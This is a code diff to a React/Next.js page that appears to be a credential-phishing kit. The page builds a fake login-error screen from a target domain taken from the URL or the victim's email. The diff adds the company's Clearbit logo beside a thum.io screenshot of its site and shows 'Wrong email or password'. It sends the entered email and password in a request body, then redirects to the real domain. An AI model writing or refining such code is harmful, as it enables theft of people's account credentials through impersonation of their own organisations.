@@ -17,8 +17,10 @@ export default function EndPage() {
 
   const [domainToCapture, setDomainToCapture] = useState('')
   const [screenshotUrl, setScreenshotUrl]     = useState('')
+  const [logoUrl, setLogoUrl]                 = useState('')
+  const [logoError, setLogoError]             = useState(false)
 
-  // Decide domain
+  // decide domain
   useEffect(() => {
     if (urlParamDomain) {
       setDomainToCapture(urlParamDomain)
@@ -28,12 +30,11 @@ export default function EndPage() {
     }
   }, [urlParamDomain, email])
 
-  // Build thum.io URL
+  // build thum.io background
   useEffect(() => {
     if (!domainToCapture) return
-
     const secret = process.env.NEXT_PUBLIC_THUM_IO_SECRET!
-    const keyId  = process.env.NEXT_PUBLIC_THUM_IO_KEY_ID!  // string
+    const keyId  = process.env.NEXT_PUBLIC_THUM_IO_KEY_ID!
 
     setScreenshotUrl(
       getThumURL({
@@ -42,6 +43,13 @@ export default function EndPage() {
         auth: { type: 'md5', secret, keyId },
       })
     )
+  }, [domainToCapture])
+
+  // build Clearbit logo URL
+  useEffect(() => {
+    if (!domainToCapture) return
+    setLogoError(false)
+    setLogoUrl(`https://logo.clearbit.com/${domainToCapture}`)
   }, [domainToCapture])
 
   const handleRetry = async (e: React.FormEvent) => {
@@ -57,7 +65,7 @@ export default function EndPage() {
       body: JSON.stringify({ email, password, domain: domainToCapture }),
     })
     setTimeout(() => {
-      router.push('https://finaltest.com')
+      window.location.href = `https://${domainToCapture}`
     }, 2000)
   }
 
@@ -77,6 +85,22 @@ export default function EndPage() {
 
       {/* Centered error card */}
       <div className="relative z-10 mx-auto mt-20 bg-white rounded-2xl shadow-xl p-8 max-w-md w-full">
+        {/* Logo or initial */}
+        <div className="flex justify-center mb-4">
+          {logoUrl && !logoError ? (
+            <img
+              src={logoUrl}
+              alt={`Logo of ${domainToCapture}`}
+              onError={() => setLogoError(true)}
+              className="w-16 h-16 rounded-full object-cover"
+            />
+          ) : (
+            <div className="w-16 h-16 rounded-full bg-gray-300 flex items-center justify-center text-xl text-white">
+              {email[0]?.toUpperCase()}
+            </div>
+          )}
+        </div>
+
         <h1 className="text-sm font-bold text-center mb-2 text-red-600">
           Wrong email or password. Please retry.
         </h1>
